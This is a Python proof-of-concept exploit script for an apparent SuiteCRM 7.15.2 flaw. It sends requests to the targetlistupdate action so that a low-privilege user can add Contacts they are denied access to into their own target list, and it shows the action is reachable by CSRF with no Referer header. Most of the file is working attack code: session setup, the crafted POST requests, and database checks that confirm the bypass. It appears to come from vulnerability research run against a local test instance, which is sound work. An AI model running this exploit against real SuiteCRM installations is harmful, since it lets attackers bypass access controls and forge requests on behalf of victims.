#!/usr/bin/env python3
"""
VULN-050 -- `targetlistupdate`: add arbitrary records (any module) to any
            target list with no ACL, CSRF-able.

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : modules/ProspectLists/TargetListUpdate.php:79 ($uids = explode(',', $_POST['uids']);
             -- no buildAccessWhere() filter, unlike the select_entire_list branch at :67)
             and :95/:104 ($focus->retrieve($id); ... $focus->$relationship->add($_REQUEST['prospect_list']);
             -- retrieve()+add() perform no ACL/ownership/SecurityGroup check).
CSRF       : action `targetlistupdate` is not save*/delete*, module `Contacts` is not in
             SugarApplication::$modifyModules, and it is not in $globalModifyActions ->
             isModifyAction() returns false (include/MVC/SugarApplication.php:502-523) ->
             the empty-Referer guard in checkHTTPReferer() (:553) never fires for this action.

Plan
----
1. Admin creates a low-privilege RegularUser L (no special role).
2. Give L a throwaway ACL Role that DENIES 'view' on Contacts entirely (ACL_ALLOW_NONE) --
   models a real deployment where L legitimately cannot see certain records. This is the
   SAME primitive earlier stage-10 clusters used (see _c1_common.restrict_role); a fresh
   install with no roles defaults every module to ACL_ALLOW_ALL for everyone, so the ACL
   bypass below is only observable once something actually restricts L.
3. Admin creates two Contacts (C1, C2), assigned to admin -- L cannot view/list either one.
4. Baseline: as L, GET Contacts DetailView(C1) and confirm SuiteCRM's own ACL blocks it
   (the 'noaccess' view fires) -- proves the restriction is real and effective everywhere else.
5. As L, create L's own ProspectList PL (L is the owner).
6. Fire targetlistupdate twice as L:
     a) uids=C1.id&prospect_list=PL.id  WITH a normal same-host Referer (functionality proof)
     b) uids=C2.id&prospect_list=PL.id  WITH NO Referer header at all (CSRF proof -- a
        cross-site auto-submitting form/img would behave identically)
7. Verify via the db container: prospect_lists_prospects gained rows for BOTH C1 and C2 under
   PL with related_type='Contacts' -- i.e. L successfully associated records it has zero ACL
   'view' access to, entirely bypassing the ACL that blocked step 4.

What a successful run proves
-----------------------------
A low-privilege user whose 'view' ACL on Contacts is explicitly denied can still use
`targetlistupdate`'s `uids` path to add those very Contacts to a list they own -- a concrete
cross-ACL object-level-authorization bypass -- and the second add succeeds with zero Referer
header, proving the action is reachable via CSRF (no token, no referer challenge).
"""
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login,
                      rest_login, rest_call, BROWSER_UA)
from _c1_common import db_rows, restrict_role, ACL_ALLOW_NONE

VULN_ID = "VULN-050"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "targetlistupdate: no-ACL add-to-list (uids branch) + CSRF")
    log("INFO", "sink: modules/ProspectLists/TargetListUpdate.php:79 (uids, no buildAccessWhere) "
                "and :95/:104 (retrieve()+add(), no ACL)")

    # --- SETUP -------------------------------------------------------------
    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login("admin", os.environ.get("ADMIN_PASS", "Admin@2026!"))

    log("SETUP", "create low-priv RegularUser L")
    low_pass = rand("Pw") + "!2026x"
    low = create_user(admin_s, low_pass)
    low_id = low["id"]
    log("OK", f"low-priv user {low['user_name']} id={low_id}")

    log("SETUP", "restrict L: Contacts 'view' = ACL_ALLOW_NONE (throwaway Role, scoped to L only)")
    role_id = restrict_role(low_id, [("Contacts", "view", ACL_ALLOW_NONE),
                                      ("Contacts", "list", ACL_ALLOW_NONE)])
    log("OK", f"role {role_id} denies Contacts view/list for {low['user_name']}")

    log("SETUP", "admin creates two Contacts assigned to admin (L cannot view either)")
    admin_id = db_rows("SELECT id FROM users WHERE user_name='admin';")[0]["id"]
    c1_name = rand("Ctgt1")
    c2_name = rand("Ctgt2")
    res_c1 = rest_call("set_entry", [admin_sid, "Contacts",
                        [{"name": "last_name", "value": c1_name},
                         {"name": "assigned_user_id", "value": admin_id}]])
    res_c2 = rest_call("set_entry", [admin_sid, "Contacts",
                        [{"name": "last_name", "value": c2_name},
                         {"name": "assigned_user_id", "value": admin_id}]])
    c1_id, c2_id = res_c1.get("id"), res_c2.get("id")
    if not c1_id or not c2_id:
        verdict(VULN_ID, "FAILED", f"could not create victim Contacts: {res_c1} / {res_c2}")
        sys.exit(1)
    log("OK", f"Contact C1={c1_id} ({c1_name}), C2={c2_id} ({c2_name}), both owned by admin")

    # --- BASELINE: prove the ACL restriction is real ------------------------
    log("STEP", "low-priv L: baseline DetailView(C1) -- expect ACL 'noaccess' block")
    low_s = web_login(low["user_name"], low["password"])
    r_base = low_s.get(f"{BASE_URL}/index.php",
                        params={"module": "Contacts", "action": "DetailView", "record": c1_id},
                        timeout=30)
    baseline_blocked = ("noaccess" in r_base.text.lower()) or (c1_name not in r_base.text)
    log("INFO", f"baseline DetailView status={r_base.status_code} contact-name-visible="
                f"{c1_name in r_base.text} (expect False)")

    log("SETUP", "low-priv L creates L's own ProspectList PL")
    low_sid = rest_login(low["user_name"], low["password"])
    pl_name = rand("PL")
    res_pl = rest_call("set_entry", [low_sid, "ProspectLists",
                        [{"name": "name", "value": pl_name},
                         {"name": "list_type", "value": "default"},
                         {"name": "assigned_user_id", "value": low_id}]])
    pl_id = res_pl.get("id")
    if not pl_id:
        verdict(VULN_ID, "FAILED", f"could not create L's ProspectList: {res_pl}")
        sys.exit(1)
    log("OK", f"ProspectList PL={pl_id} ({pl_name}) owned by L")

    # --- STEP: exploit (a) normal referer -----------------------------------
    log("STEP", "targetlistupdate uids=C1 (with normal Referer) -- functionality proof")
    r1 = low_s.post(
        f"{BASE_URL}/index.php",
        params={"module": "Contacts", "action": "targetlistupdate"},
        data={"uids": c1_id, "prospect_list": pl_id},
        headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=index"},
        allow_redirects=False, timeout=30,
    )
    log("INFO", f"targetlistupdate(C1) -> HTTP {r1.status_code} loc={r1.headers.get('Location', '')!r}")

    # --- STEP: exploit (b) NO referer at all -> CSRF proof ------------------
    log("STEP", "targetlistupdate uids=C2 (NO Referer header at all) -- CSRF proof")
    csrf_session_headers = {"User-Agent": BROWSER_UA}  # deliberately no Referer key
    import requests
    r2 = requests.post(
        f"{BASE_URL}/index.php",
        params={"module": "Contacts", "action": "targetlistupdate"},
        data={"uids": c2_id, "prospect_list": pl_id},
        headers=csrf_session_headers,
        cookies=low_s.cookies,
        allow_redirects=False, timeout=30,
    )
    log("INFO", f"targetlistupdate(C2, no Referer) -> HTTP {r2.status_code} "
                f"loc={r2.headers.get('Location', '')!r}")

    # --- persist evidence ----------------------------------------------------
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### (a) normal add, with Referer\n"
            f"POST /index.php?module=Contacts&action=targetlistupdate HTTP/1.1\n"
            f"Host: localhost:33116\nCookie: PHPSESSID=<low-priv session>\n"
            f"Referer: {BASE_URL}/index.php?module=Contacts&action=index\n"
            f"Content-Type: application/x-www-form-urlencoded\n\n"
            f"uids={c1_id}&prospect_list={pl_id}\n\n"
            "### (b) CSRF-style add, NO Referer header at all\n"
            f"POST /index.php?module=Contacts&action=targetlistupdate HTTP/1.1\n"
            f"Host: localhost:33116\nCookie: PHPSESSID=<low-priv session>\n"
            f"Content-Type: application/x-www-form-urlencoded\n\n"
            f"uids={c2_id}&prospect_list={pl_id}\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"(a) HTTP {r1.status_code} Location={r1.headers.get('Location','')}\n"
                f"(b) HTTP {r2.status_code} Location={r2.headers.get('Location','')}\n")

    # --- verify the REAL effect: prospect_lists_prospects rows in the db ----
    log("STEP", "db-verify prospect_lists_prospects rows for C1 and C2 under PL")
    rows = db_rows(
        "SELECT related_id, related_type, prospect_list_id, deleted FROM prospect_lists_prospects "
        f"WHERE prospect_list_id='{pl_id}' AND related_id IN ('{c1_id}','{c2_id}') AND deleted=0;"
    )
    log("PROOF", f"prospect_lists_prospects rows: {rows}")
    with open(os.path.join(HERE, "evidence", "db_rows.txt"), "w") as f:
        f.write(f"PL={pl_id} C1={c1_id} C2={c2_id}\n{rows}\n")

    got_c1 = any(r["related_id"] == c1_id for r in rows)
    got_c2 = any(r["related_id"] == c2_id for r in rows)

    ok = baseline_blocked and got_c1 and got_c2
    if not ok:
        reasons = []
        if not baseline_blocked:
            reasons.append("baseline ACL restriction did not actually block L's DetailView (setup invalid)")
        if not got_c1:
            reasons.append("normal-Referer add of C1 did not create a prospect_lists_prospects row")
        if not got_c2:
            reasons.append("no-Referer (CSRF) add of C2 did not create a prospect_lists_prospects row")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", f"L (denied Contacts view/list ACL) added BOTH admin-owned Contacts to L's own list "
              f"PL={pl_id}; the second add used zero Referer header (CSRF-reachable).")
    verdict(VULN_ID, "CONFIRMED",
            f"uids-branch ACL bypass: C1={c1_id[:8]}.. and C2={c2_id[:8]}.. (no-Referer) both "
            f"linked into PL={pl_id[:8]}.. despite denied view ACL")
    sys.exit(0)


if __name__ == "__main__":
    main()
